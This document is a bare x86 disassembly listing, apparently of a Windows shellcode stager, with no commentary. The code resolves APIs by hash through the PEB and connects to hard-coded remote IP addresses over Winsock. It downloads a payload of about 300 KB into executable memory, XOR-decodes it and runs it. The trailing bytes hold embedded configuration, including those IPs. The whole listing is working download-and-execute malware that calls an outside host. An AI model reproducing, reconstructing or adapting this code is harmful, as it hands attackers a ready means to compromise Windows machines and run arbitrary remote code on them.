0000: 55                   push     ebp
0001: 8bec                 mov      ebp, esp
0003: 83e4f8               and      esp, 0xfffffff8
0006: 81ecf8010000         sub      esp, 0x1f8
000c: 8d0c24               lea      ecx, [esp]
000f: 53                   push     ebx
0010: 56                   push     esi
0011: e808030000           call     0x31e
0016: 85c0                 test     eax, eax
0018: 7412                 je       0x2c
001a: 8d442470             lea      eax, [esp + 0x70]
001e: 50                   push     eax
001f: 6802020000           push     0x202
0024: ff542424             call     dword ptr [esp + 0x24]
0028: 85c0                 test     eax, eax
002a: 740a                 je       0x36
002c: 5e                   pop      esi
002d: 33c0                 xor      eax, eax
002f: 5b                   pop      ebx
0030: 8be5                 mov      esp, ebp
0032: 5d                   pop      ebp
0033: c20400               ret      4
0036: e829020000           call     0x264
003b: 43                   inc      ebx
003c: 4b                   dec      ebx
003d: 33c9                 xor      ecx, ecx
003f: 803c016f             cmp      byte ptr [ecx + eax], 0x6f
0043: 7531                 jne      0x76
0045: 807c010164           cmp      byte ptr [ecx + eax + 1], 0x64
004a: 752a                 jne      0x76
004c: 807c010261           cmp      byte ptr [ecx + eax + 2], 0x61
0051: 7523                 jne      0x76
0053: 807c01036b           cmp      byte ptr [ecx + eax + 3], 0x6b
0058: 751c                 jne      0x76
005a: 807c010474           cmp      byte ptr [ecx + eax + 4], 0x74
005f: 7515                 jne      0x76
0061: 807c01056f           cmp      byte ptr [ecx + eax + 5], 0x6f
0066: 750e                 jne      0x76
0068: 807c01066d           cmp      byte ptr [ecx + eax + 6], 0x6d
006d: 7507                 jne      0x76
006f: 807c01076b           cmp      byte ptr [ecx + eax + 7], 0x6b
0074: 740e                 je       0x84
0076: 41                   inc      ecx
0077: 81f959250000         cmp      ecx, 0x2559
007d: 7cc0                 jl       0x3f
007f: e981000000           jmp      0x105
0084: 03c1                 add      eax, ecx
0086: 8944245c             mov      dword ptr [esp + 0x5c], eax
008a: 43                   inc      ebx
008b: 4b                   dec      ebx
008c: 8b44245c             mov      eax, dword ptr [esp + 0x5c]
0090: be00300000           mov      esi, 0x3000
0095: 6a40                 push     0x40
0097: 56                   push     esi
0098: ff7020               push     dword ptr [eax + 0x20]
009b: 6a00                 push     0
009d: ff54241c             call     dword ptr [esp + 0x1c]
00a1: 89442464             mov      dword ptr [esp + 0x64], eax
00a5: 43                   inc      ebx
00a6: 4b                   dec      ebx
00a7: 8b44245c             mov      eax, dword ptr [esp + 0x5c]
00ab: ff7020               push     dword ptr [eax + 0x20]
00ae: ff742468             push     dword ptr [esp + 0x68]
00b2: ff542448             call     dword ptr [esp + 0x48]
00b6: 43                   inc      ebx
00b7: 4b                   dec      ebx
00b8: 8b44245c             mov      eax, dword ptr [esp + 0x5c]
00bc: ff7020               push     dword ptr [eax + 0x20]
00bf: 83c038               add      eax, 0x38
00c2: 50                   push     eax
00c3: ff74246c             push     dword ptr [esp + 0x6c]
00c7: ff542448             call     dword ptr [esp + 0x48]
00cb: 43                   inc      ebx
00cc: 4b                   dec      ebx
00cd: 8b44245c             mov      eax, dword ptr [esp + 0x5c]
00d1: 6a40                 push     0x40
00d3: 56                   push     esi
00d4: ff702c               push     dword ptr [eax + 0x2c]
00d7: 6a00                 push     0
00d9: ff54241c             call     dword ptr [esp + 0x1c]
00dd: 8b4c245c             mov      ecx, dword ptr [esp + 0x5c]
00e1: 89442468             mov      dword ptr [esp + 0x68], eax
00e5: ff712c               push     dword ptr [ecx + 0x2c]
00e8: 50                   push     eax
00e9: ff542448             call     dword ptr [esp + 0x48]
00ed: 8b4c245c             mov      ecx, dword ptr [esp + 0x5c]
00f1: 8b4120               mov      eax, dword ptr [ecx + 0x20]
00f4: ff712c               push     dword ptr [ecx + 0x2c]
00f7: 83c038               add      eax, 0x38
00fa: 03c1                 add      eax, ecx
00fc: 50                   push     eax
00fd: ff742470             push     dword ptr [esp + 0x70]
0101: ff542448             call     dword ptr [esp + 0x48]
0105: 8b4c245c             mov      ecx, dword ptr [esp + 0x5c]
0109: 8b412c               mov      eax, dword ptr [ecx + 0x2c]
010c: 83c01c               add      eax, 0x1c
010f: 034120               add      eax, dword ptr [ecx + 0x20]
0112: 8d0441               lea      eax, [ecx + eax*2]
0115: 89442460             mov      dword ptr [esp + 0x60], eax
0119: 8d4c2408             lea      ecx, [esp + 8]
011d: e802000000           call     0x124
0122: ebf5                 jmp      0x119
0124: 55                   push     ebp
0125: 8bec                 mov      ebp, esp
0127: 83ec10               sub      esp, 0x10
012a: 53                   push     ebx
012b: 56                   push     esi
012c: 57                   push     edi
012d: 6a06                 push     6
012f: 8bf1                 mov      esi, ecx
0131: 33db                 xor      ebx, ebx
0133: 6a01                 push     1
0135: 6a02                 push     2
0137: 8975f8               mov      dword ptr [ebp - 8], esi
013a: 8bfb                 mov      edi, ebx
013c: 895df4               mov      dword ptr [ebp - 0xc], ebx
013f: ff5618               call     dword ptr [esi + 0x18]
0142: 89463c               mov      dword ptr [esi + 0x3c], eax
0145: 83f8ff               cmp      eax, -1
0148: 0f84ef000000         je       0x23d
014e: 6a40                 push     0x40
0150: 6800300000           push     0x3000
0155: 680e000800           push     0x8000e
015a: 53                   push     ebx
015b: ff5604               call     dword ptr [esi + 4]
015e: 894650               mov      dword ptr [esi + 0x50], eax
0161: 85c0                 test     eax, eax
0163: 0f84d4000000         je       0x23d
0169: 8d45f4               lea      eax, [ebp - 0xc]
016c: 50                   push     eax
016d: 53                   push     ebx
016e: 53                   push     ebx
016f: ff765c               push     dword ptr [esi + 0x5c]
0172: ff561c               call     dword ptr [esi + 0x1c]
0175: 85c0                 test     eax, eax
0177: 0f85c0000000         jne      0x23d
017d: 8d5e40               lea      ebx, [esi + 0x40]
0180: 8b75f4               mov      esi, dword ptr [ebp - 0xc]
0183: 8bfb                 mov      edi, ebx
0185: 8b7618               mov      esi, dword ptr [esi + 0x18]
0188: a5                   movsd    dword ptr es:[edi], dword ptr [esi]
0189: a5                   movsd    dword ptr es:[edi], dword ptr [esi]
018a: a5                   movsd    dword ptr es:[edi], dword ptr [esi]
018b: a5                   movsd    dword ptr es:[edi], dword ptr [esi]
018c: 8b75f8               mov      esi, dword ptr [ebp - 8]
018f: 8b4654               mov      eax, dword ptr [esi + 0x54]
0192: ff7024               push     dword ptr [eax + 0x24]
0195: ff5620               call     dword ptr [esi + 0x20]
0198: 6a10                 push     0x10
019a: 53                   push     ebx
019b: ff763c               push     dword ptr [esi + 0x3c]
019e: 66894642             mov      word ptr [esi + 0x42], ax
01a2: ff5624               call     dword ptr [esi + 0x24]
01a5: 33db                 xor      ebx, ebx
01a7: 83f8ff               cmp      eax, -1
01aa: 0f848b000000         je       0x23b
01b0: 53                   push     ebx
01b1: 6a03                 push     3
01b3: 8d45fc               lea      eax, [ebp - 4]
01b6: 66c745fc3332         mov      word ptr [ebp - 4], 0x3233
01bc: 50                   push     eax
01bd: ff763c               push     dword ptr [esi + 0x3c]
01c0: 885dfe               mov      byte ptr [ebp - 2], bl
01c3: ff5628               call     dword ptr [esi + 0x28]
01c6: 85c0                 test     eax, eax
01c8: 7e71                 jle      0x23b
01ca: 6a04                 push     4
01cc: 6800300000           push     0x3000
01d1: 6800d80400           push     0x4d800
01d6: 53                   push     ebx
01d7: 895df8               mov      dword ptr [ebp - 8], ebx
01da: ff5604               call     dword ptr [esi + 4]
01dd: 8bf8                 mov      edi, eax
01df: 85ff                 test     edi, edi
01e1: 745a                 je       0x23d
01e3: 53                   push     ebx
01e4: 6800900100           push     0x19000
01e9: 57                   push     edi
01ea: ff763c               push     dword ptr [esi + 0x3c]
01ed: ff562c               call     dword ptr [esi + 0x2c]
01f0: 8945f0               mov      dword ptr [ebp - 0x10], eax
01f3: 85c0                 test     eax, eax
01f5: 7e46                 jle      0x23d
01f7: 8b4e50               mov      ecx, dword ptr [esi + 0x50]
01fa: 034df8               add      ecx, dword ptr [ebp - 8]
01fd: 50                   push     eax
01fe: 57                   push     edi
01ff: 51                   push     ecx
0200: ff5634               call     dword ptr [esi + 0x34]
0203: 8b45f8               mov      eax, dword ptr [ebp - 8]
0206: 0345f0               add      eax, dword ptr [ebp - 0x10]
0209: 8945f8               mov      dword ptr [ebp - 8], eax
020c: 3d0eb00400           cmp      eax, 0x4b00e
0211: 75d0                 jne      0x1e3
0213: 6800800000           push     0x8000
0218: 53                   push     ebx
0219: 57                   push     edi
021a: ff5608               call     dword ptr [esi + 8]
021d: 8346500e             add      dword ptr [esi + 0x50], 0xe
0221: 8b4650               mov      eax, dword ptr [esi + 0x50]
0224: 8034189d             xor      byte ptr [eax + ebx], 0x9d
0228: 43                   inc      ebx
0229: 81fb0eb00400         cmp      ebx, 0x4b00e
022f: 7cf0                 jl       0x221
0231: ff5650               call     dword ptr [esi + 0x50]
0234: ff7658               push     dword ptr [esi + 0x58]
0237: ffd0                 call     eax
0239: ebfe                 jmp      0x239
023b: 8bfb                 mov      edi, ebx
023d: 837e5000             cmp      dword ptr [esi + 0x50], 0
0241: 740c                 je       0x24f
0243: 6800800000           push     0x8000
0248: 53                   push     ebx
0249: ff7650               push     dword ptr [esi + 0x50]
024c: ff5608               call     dword ptr [esi + 8]
024f: 85ff                 test     edi, edi
0251: 740a                 je       0x25d
0253: 6800800000           push     0x8000
0258: 53                   push     ebx
0259: 57                   push     edi
025a: ff5608               call     dword ptr [esi + 8]
025d: 5f                   pop      edi
025e: 5e                   pop      esi
025f: 5b                   pop      ebx
0260: 8be5                 mov      esp, ebp
0262: 5d                   pop      ebp
0263: c3                   ret      
0264: 8b0424               mov      eax, dword ptr [esp]
0267: c3                   ret      
0268: 55                   push     ebp
0269: 8bec                 mov      ebp, esp
026b: 83ec1c               sub      esp, 0x1c
026e: 53                   push     ebx
026f: 56                   push     esi
0270: 8bf1                 mov      esi, ecx
0272: 8bda                 mov      ebx, edx
0274: 57                   push     edi
0275: 895df4               mov      dword ptr [ebp - 0xc], ebx
0278: 8975f8               mov      dword ptr [ebp - 8], esi
027b: 8b463c               mov      eax, dword ptr [esi + 0x3c]
027e: 8b443078             mov      eax, dword ptr [eax + esi + 0x78]
0282: 03c6                 add      eax, esi
0284: 8b5020               mov      edx, dword ptr [eax + 0x20]
0287: 8b481c               mov      ecx, dword ptr [eax + 0x1c]
028a: 03d6                 add      edx, esi
028c: 8955fc               mov      dword ptr [ebp - 4], edx
028f: 03ce                 add      ecx, esi
0291: 8b5024               mov      edx, dword ptr [eax + 0x24]
0294: 03d6                 add      edx, esi
0296: 894de4               mov      dword ptr [ebp - 0x1c], ecx
0299: 8955e8               mov      dword ptr [ebp - 0x18], edx
029c: f7c30000ffff         test     ebx, 0xffff0000
02a2: 744e                 je       0x2f2
02a4: 8b4018               mov      eax, dword ptr [eax + 0x18]
02a7: 33d2                 xor      edx, edx
02a9: 8945ec               mov      dword ptr [ebp - 0x14], eax
02ac: 8bfa                 mov      edi, edx
02ae: 85c0                 test     eax, eax
02b0: 7448                 je       0x2fa
02b2: 8b45fc               mov      eax, dword ptr [ebp - 4]
02b5: 8b1cb8               mov      ebx, dword ptr [eax + edi*4]
02b8: 03de                 add      ebx, esi
02ba: 8bf2                 mov      esi, edx
02bc: 8a0b                 mov      cl, byte ptr [ebx]
02be: 6bf67f               imul     esi, esi, 0x7f
02c1: 0fbec1               movsx    eax, cl
02c4: 03f0                 add      esi, eax
02c6: 43                   inc      ebx
02c7: 84c9                 test     cl, cl
02c9: 75f1                 jne      0x2bc
02cb: 8b5df4               mov      ebx, dword ptr [ebp - 0xc]
02ce: 8975f0               mov      dword ptr [ebp - 0x10], esi
02d1: 8b75f8               mov      esi, dword ptr [ebp - 8]
02d4: 3b5df0               cmp      ebx, dword ptr [ebp - 0x10]
02d7: 7408                 je       0x2e1
02d9: 47                   inc      edi
02da: 3b7dec               cmp      edi, dword ptr [ebp - 0x14]
02dd: 72d3                 jb       0x2b2
02df: eb19                 jmp      0x2fa
02e1: 8b45e8               mov      eax, dword ptr [ebp - 0x18]
02e4: 8b4de4               mov      ecx, dword ptr [ebp - 0x1c]
02e7: 0fb70478             movzx    eax, word ptr [eax + edi*2]
02eb: 8b0481               mov      eax, dword ptr [ecx + eax*4]
02ee: 03c6                 add      eax, esi
02f0: eb0a                 jmp      0x2fc
02f2: 2b5810               sub      ebx, dword ptr [eax + 0x10]
02f5: 8b1499               mov      edx, dword ptr [ecx + ebx*4]
02f8: 03d6                 add      edx, esi
02fa: 8bc2                 mov      eax, edx
02fc: 5f                   pop      edi
02fd: 5e                   pop      esi
02fe: 5b                   pop      ebx
02ff: 8be5                 mov      esp, ebp
0301: 5d                   pop      ebp
0302: c3                   ret      
0303: 64a118000000         mov      eax, dword ptr fs:[0x18]
0309: 90                   nop      
030a: 8b4030               mov      eax, dword ptr [eax + 0x30]
030d: 90                   nop      
030e: 8b400c               mov      eax, dword ptr [eax + 0xc]
0311: 90                   nop      
0312: 8b400c               mov      eax, dword ptr [eax + 0xc]
0315: 90                   nop      
0316: 8b00                 mov      eax, dword ptr [eax]
0318: 8b00                 mov      eax, dword ptr [eax]
031a: 8b4018               mov      eax, dword ptr [eax + 0x18]
031d: c3                   ret      
031e: 55                   push     ebp
031f: 8bec                 mov      ebp, esp
0321: 83ec18               sub      esp, 0x18
0324: 53                   push     ebx
0325: 56                   push     esi
0326: 57                   push     edi
0327: 8bd9                 mov      ebx, ecx
0329: e8d5ffffff           call     0x303
032e: 8bf8                 mov      edi, eax
0330: c745e85773325f       mov      dword ptr [ebp - 0x18], 0x5f327357
0337: ba54be4801           mov      edx, 0x148be54
033c: c745ec33322e64       mov      dword ptr [ebp - 0x14], 0x642e3233
0343: 8bcf                 mov      ecx, edi
0345: 66c745f06c6c         mov      word ptr [ebp - 0x10], 0x6c6c
034b: c645f200             mov      byte ptr [ebp - 0xe], 0
034f: c745f46e74646c       mov      dword ptr [ebp - 0xc], 0x6c64746e
0356: c745f86c2e646c       mov      dword ptr [ebp - 8], 0x6c642e6c
035d: 66c745fc6c00         mov      word ptr [ebp - 4], 0x6c
0363: e800ffffff           call     0x268
0368: 8bf0                 mov      esi, eax
036a: ba36382900           mov      edx, 0x293836
036f: 8bcf                 mov      ecx, edi
0371: 8933                 mov      dword ptr [ebx], esi
0373: e8f0feffff           call     0x268
0378: ba696dae84           mov      edx, 0x84ae6d69
037d: 894304               mov      dword ptr [ebx + 4], eax
0380: 8bcf                 mov      ecx, edi
0382: e8e1feffff           call     0x268
0387: ba5a3ac15e           mov      edx, 0x5ec13a5a
038c: 894308               mov      dword ptr [ebx + 8], eax
038f: 8bcf                 mov      ecx, edi
0391: e8d2feffff           call     0x268
0396: baa5e34b68           mov      edx, 0x684be3a5
039b: 89430c               mov      dword ptr [ebx + 0xc], eax
039e: 8bcf                 mov      ecx, edi
03a0: e8c3feffff           call     0x268
03a5: 894310               mov      dword ptr [ebx + 0x10], eax
03a8: 8d45e8               lea      eax, [ebp - 0x18]
03ab: 50                   push     eax
03ac: ffd6                 call     esi
03ae: 8bf0                 mov      esi, eax
03b0: ba88c48bc1           mov      edx, 0xc18bc488
03b5: 8bce                 mov      ecx, esi
03b7: e8acfeffff           call     0x268
03bc: baedab1698           mov      edx, 0x9816abed
03c1: 894314               mov      dword ptr [ebx + 0x14], eax
03c4: 8bce                 mov      ecx, esi
03c6: e89dfeffff           call     0x268
03cb: ba6b36ceab           mov      edx, 0xabce366b
03d0: 894318               mov      dword ptr [ebx + 0x18], eax
03d3: 8bce                 mov      ecx, esi
03d5: e88efeffff           call     0x268
03da: ba98cd5215           mov      edx, 0x1552cd98
03df: 89431c               mov      dword ptr [ebx + 0x1c], eax
03e2: 8bce                 mov      ecx, esi
03e4: e87ffeffff           call     0x268
03e9: ba9632b8f9           mov      edx, 0xf9b83296
03ee: 894320               mov      dword ptr [ebx + 0x20], eax
03f1: 8bce                 mov      ecx, esi
03f3: e870feffff           call     0x268
03f8: ba98b59b03           mov      edx, 0x39bb598
03fd: 894324               mov      dword ptr [ebx + 0x24], eax
0400: 8bce                 mov      ecx, esi
0402: e861feffff           call     0x268
0407: ba7a8b17f4           mov      edx, 0xf4178b7a
040c: 894328               mov      dword ptr [ebx + 0x28], eax
040f: 8bce                 mov      ecx, esi
0411: e852feffff           call     0x268
0416: ba81c762cc           mov      edx, 0xcc62c781
041b: 89432c               mov      dword ptr [ebx + 0x2c], eax
041e: 8bce                 mov      ecx, esi
0420: e843feffff           call     0x268
0425: 894330               mov      dword ptr [ebx + 0x30], eax
0428: 8d45f4               lea      eax, [ebp - 0xc]
042b: 50                   push     eax
042c: ff13                 call     dword ptr [ebx]
042e: 8bf0                 mov      esi, eax
0430: ba045723ed           mov      edx, 0xed235704
0435: 8bce                 mov      ecx, esi
0437: e82cfeffff           call     0x268
043c: ba0ddc7e09           mov      edx, 0x97edc0d
0441: 894334               mov      dword ptr [ebx + 0x34], eax
0444: 8bce                 mov      ecx, esi
0446: e81dfeffff           call     0x268
044b: 33c9                 xor      ecx, ecx
044d: 894338               mov      dword ptr [ebx + 0x38], eax
0450: 8bc1                 mov      eax, ecx
0452: 390c83               cmp      dword ptr [ebx + eax*4], ecx
0455: 7414                 je       0x46b
0457: 40                   inc      eax
0458: 83f80f               cmp      eax, 0xf
045b: 72f5                 jb       0x452
045d: 33c0                 xor      eax, eax
045f: 894b50               mov      dword ptr [ebx + 0x50], ecx
0462: 894b54               mov      dword ptr [ebx + 0x54], ecx
0465: 40                   inc      eax
0466: 894b58               mov      dword ptr [ebx + 0x58], ecx
0469: eb02                 jmp      0x46d
046b: 33c0                 xor      eax, eax
046d: 5f                   pop      edi
046e: 5e                   pop      esi
046f: 5b                   pop      ebx
0470: 8be5                 mov      esp, ebp
0472: 5d                   pop      ebp
0473: c3                   ret      
0474: 6f                   outsd    dx, dword ptr [esi]
0475: 6461                 popal    
0477: 6b746f6d6b           imul     esi, dword ptr [edi + ebp*2 + 0x6d], 0x6b
047c: 0000                 add      byte ptr [eax], al
047e: 0000                 add      byte ptr [eax], al
0480: 0000                 add      byte ptr [eax], al
0482: 0000                 add      byte ptr [eax], al
0484: 0000                 add      byte ptr [eax], al
0486: 0000                 add      byte ptr [eax], al
0488: 0000                 add      byte ptr [eax], al
048a: 0000                 add      byte ptr [eax], al
048c: 0000                 add      byte ptr [eax], al
048e: 0000                 add      byte ptr [eax], al
0490: 0000                 add      byte ptr [eax], al
0492: 0000                 add      byte ptr [eax], al
0494: 0c00                 or       al, 0
0496: 0000                 add      byte ptr [eax], al
0498: 0a1a                 or       bl, byte ptr [edx]
049a: 0000                 add      byte ptr [eax], al
049c: 0100                 add      dword ptr [eax], eax
049e: 0000                 add      byte ptr [eax], al
04a0: 0c00                 or       al, 0
04a2: 0000                 add      byte ptr [eax], al
04a4: b822000001           mov      eax, 0x1000022
04a9: 0000                 add      byte ptr [eax], al
04ab: 0032                 add      byte ptr [edx], dh
04ad: 3032                 xor      byte ptr [edx], dh
04af: 2e39352e382e32       cmp      dword ptr cs:[0x322e382e], esi
04b6: 37                   aaa      
04b7: 0032                 add      byte ptr [edx], dh
04b9: 3032                 xor      byte ptr [edx], dh
04bb: 2e39352e382e32       cmp      dword ptr cs:[0x322e382e], esi
04c2: 37                   aaa      
04c3: 007c0030             add      byte ptr [eax + eax + 0x30], bh
04c7: 003a                 add      byte ptr [edx], bh
04c9: 00640062             add      byte ptr [eax + eax + 0x62], ah
04cd: 007c0030             add      byte ptr [eax + eax + 0x30], bh
04d1: 003a                 add      byte ptr [edx], bh
04d3: 006c006b             add      byte ptr [eax + eax + 0x6b], ch
04d7: 007c0030             add      byte ptr [eax + eax + 0x30], bh
04db: 003a                 add      byte ptr [edx], bh
04dd: 006800               add      byte ptr [eax], ch
04e0: 7300                 jae      0x4e2
04e2: 7c00                 jl       0x4e4
04e4: 3000                 xor      byte ptr [eax], al
04e6: 3a00                 cmp      al, byte ptr [eax]
04e8: 6c                   insb     byte ptr es:[edi], dx
04e9: 0064007c             add      byte ptr [eax + eax + 0x7c], ah
04ed: 0030                 add      byte ptr [eax], dh
04ef: 003a                 add      byte ptr [edx], bh
04f1: 006c006c             add      byte ptr [eax + eax + 0x6c], ch
04f5: 007c0030             add      byte ptr [eax + eax + 0x30], bh
04f9: 003a                 add      byte ptr [edx], bh
04fb: 006800               add      byte ptr [eax], ch
04fe: 6200                 bound    eax, qword ptr [eax]
0500: 7c00                 jl       0x502
0502: 3000                 xor      byte ptr [eax], al
0504: 3a00                 cmp      al, byte ptr [eax]
0506: 7000                 jo       0x508
0508: 6a00                 push     0
050a: 7c00                 jl       0x50c
050c: 37                   aaa      
050d: 0031                 add      byte ptr [ecx], dh
050f: 002e                 add      byte ptr [esi], ch
0511: 0036                 add      byte ptr [esi], dh
0513: 0020                 add      byte ptr [eax], ah
0515: 002e                 add      byte ptr [esi], ch
0517: 0036                 add      byte ptr [esi], dh
0519: 0032                 add      byte ptr [edx], dh
051b: 0030                 add      byte ptr [eax], dh
051d: 0032                 add      byte ptr [edx], dh
051f: 003a                 add      byte ptr [edx], bh
0521: 007a00               add      byte ptr [edx], bh
0524: 6200                 bound    eax, qword ptr [eax]
0526: 7c00                 jl       0x528
0528: 3000                 xor      byte ptr [eax], al
052a: 2e0031               add      byte ptr cs:[ecx], dh
052d: 003a                 add      byte ptr [edx], bh
052f: 006200               add      byte ptr [edx], ah
0532: 6200                 bound    eax, qword ptr [eax]
0534: 7c00                 jl       0x536
0536: a4                   movsb    byte ptr es:[edi], byte ptr [esi]
0537: 8bd8                 mov      ebx, eax
0539: 9e                   sahf     
053a: 3a00                 cmp      al, byte ptr [eax]
053c: 7a00                 jp       0x53e
053e: 66007c0031           add      byte ptr [eax + eax + 0x31], bh
0543: 003a                 add      byte ptr [edx], bh
0545: 006c0063             add      byte ptr [eax + eax + 0x63], ch
0549: 007c0031             add      byte ptr [eax + eax + 0x31], bh
054d: 003a                 add      byte ptr [edx], bh
054f: 00640064             add      byte ptr [eax + eax + 0x64], ah
0553: 007c0031             add      byte ptr [eax + eax + 0x31], bh
0557: 003a                 add      byte ptr [edx], bh
0559: 0033                 add      byte ptr [ebx], dh
055b: 0074007c             add      byte ptr [eax + eax + 0x7c], dh
055f: 0030                 add      byte ptr [eax], dh
0561: 0038                 add      byte ptr [eax], bh
0563: 003a                 add      byte ptr [edx], bh
0565: 0033                 add      byte ptr [ebx], dh
0567: 006f00               add      byte ptr [edi], ch
056a: 7c00                 jl       0x56c
056c: 3100                 xor      dword ptr [eax], eax
056e: 2e0030               add      byte ptr cs:[eax], dh
0571: 002e                 add      byte ptr [esi], ch
0573: 0030                 add      byte ptr [eax], dh
0575: 002e                 add      byte ptr [esi], ch
0577: 0037                 add      byte ptr [edi], dh
0579: 0032                 add      byte ptr [edx], dh
057b: 0031                 add      byte ptr [ecx], dh
057d: 003a                 add      byte ptr [edx], bh
057f: 0033                 add      byte ptr [ebx], dh
0581: 007000               add      byte ptr [eax], dh
0584: 7c00                 jl       0x586
0586: 3100                 xor      dword ptr [eax], eax
0588: 3a00                 cmp      al, byte ptr [eax]
058a: 3200                 xor      al, byte ptr [eax]
058c: 7400                 je       0x58e
058e: 7c00                 jl       0x590
0590: 3800                 cmp      byte ptr [eax], al
0592: 3800                 cmp      byte ptr [eax], al
0594: 3800                 cmp      byte ptr [eax], al
0596: 3800                 cmp      byte ptr [eax], al
0598: 3a00                 cmp      al, byte ptr [eax]
059a: 3200                 xor      al, byte ptr [eax]
059c: 6f                   outsd    dx, dword ptr [esi]
059d: 007c0037             add      byte ptr [eax + eax + 0x37], bh
05a1: 0032                 add      byte ptr [edx], dh
05a3: 002e                 add      byte ptr [esi], ch
05a5: 0038                 add      byte ptr [eax], bh
05a7: 002e                 add      byte ptr [esi], ch
05a9: 00350039002e         add      byte ptr [0x2e003900], dh
05af: 0032                 add      byte ptr [edx], dh
05b1: 0030                 add      byte ptr [eax], dh
05b3: 0032                 add      byte ptr [edx], dh
05b5: 003a                 add      byte ptr [edx], bh
05b7: 0032                 add      byte ptr [edx], dh
05b9: 007000               add      byte ptr [eax], dh
05bc: 7c00                 jl       0x5be
05be: 3100                 xor      dword ptr [eax], eax
05c0: 3a00                 cmp      al, byte ptr [eax]
05c2: 3100                 xor      dword ptr [eax], eax
05c4: 7400                 je       0x5c6
05c6: 7c00                 jl       0x5c8
05c8: 360036               add      byte ptr ss:[esi], dh
05cb: 0036                 add      byte ptr [esi], dh
05cd: 0036                 add      byte ptr [esi], dh
05cf: 003a                 add      byte ptr [edx], bh
05d1: 0031                 add      byte ptr [ecx], dh
05d3: 006f00               add      byte ptr [edi], ch
05d6: 7c00                 jl       0x5d8
05d8: 37                   aaa      
05d9: 0032                 add      byte ptr [edx], dh
05db: 002e                 add      byte ptr [esi], ch
05dd: 0038                 add      byte ptr [eax], bh
05df: 002e                 add      byte ptr [esi], ch
05e1: 00350039002e         add      byte ptr [0x2e003900], dh
05e7: 0032                 add      byte ptr [edx], dh
05e9: 0030                 add      byte ptr [eax], dh
05eb: 0032                 add      byte ptr [edx], dh
05ed: 003a                 add      byte ptr [edx], bh
05ef: 0031                 add      byte ptr [ecx], dh
05f1: 007000               add      byte ptr [eax], dh
05f4: 7c00                 jl       0x5f6
05f6: 0000                 add      byte ptr [eax], al
